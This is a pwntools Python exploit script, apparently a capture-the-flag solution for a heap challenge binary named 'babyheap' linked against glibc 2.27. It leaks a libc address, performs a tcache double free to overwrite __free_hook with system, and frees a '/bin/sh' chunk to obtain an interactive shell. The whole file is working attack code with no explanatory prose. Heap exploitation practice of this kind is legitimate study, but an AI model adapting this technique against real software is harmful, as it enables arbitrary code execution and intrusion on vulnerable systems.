#!/usr/bin/env python
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './babyheap'

libc = ELF('./libc/libc-2.27.so')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * alloc
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

def alloc(idx, size, data):
    log.info(f"malloc({size}) @ idx[{idx}]")
    io.sendline(b"1")
    io.recvuntil(b"?")
    io.sendline(size)
    io.recvuntil(b"?")
    io.sendline(idx)
    io.recvuntil(b"?")
    io.sendline(data)

def show(idx):
    io.sendline(b"2")
    io.recvuntil(b"?")
    io.sendline(idx)

def free(idx):
    io.sendline(b"3")
    io.recvuntil(b"?")
    io.sendline(idx)

prompt = b"4. Exit"
io.recvuntil(prompt)

alloc(b"0", b"2000", b"AAAA")
io.recvuntil(prompt)
alloc(b"1", b"2000", b"BBBB")
io.recvuntil(prompt)
free(b"0")
io.recvuntil(prompt)
show(b"0")
response = io.recvuntil(prompt)
arena_leak = u64(response.split(b"\n")[2].ljust(8, b"\x00"))
log.info(f"Leaked {hex(arena_leak)}")

libc_base = arena_leak - 4111520
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
log.info(f"system = {hex(system)}")
log.info(f"free_hook = {hex(free_hook)}")

alloc(b"2", b"64", b"CCCC") # chunk C
io.recvuntil(prompt)
free(b"2")                  # free-list: C
io.recvuntil(prompt)
free(b"2") # double free (tcache dup) # free-list: C => C
io.recvuntil(prompt) 
free(b"2")                            # free-list: C => C => C
io.recvuntil(prompt) 

alloc(b"3", b"64", p64(free_hook) + b"EEEEEEEEFFFFFFFF")
io.recvuntil(prompt) 
# free-list: C => free_hook => ???

alloc(b"4", b"64", b"GGGGGGGGHHHHHHHHIIIIIIII")
io.recvuntil(prompt) 
# free-list: free_hook => ???

alloc(b"5", b"64", p64(system))
io.recvuntil(prompt) 
# now we wrote system into the free_hook

alloc(b"6", b"64", b"/bin/sh\x00")
io.recvuntil(prompt) 

free(b"6")

io.interactive()

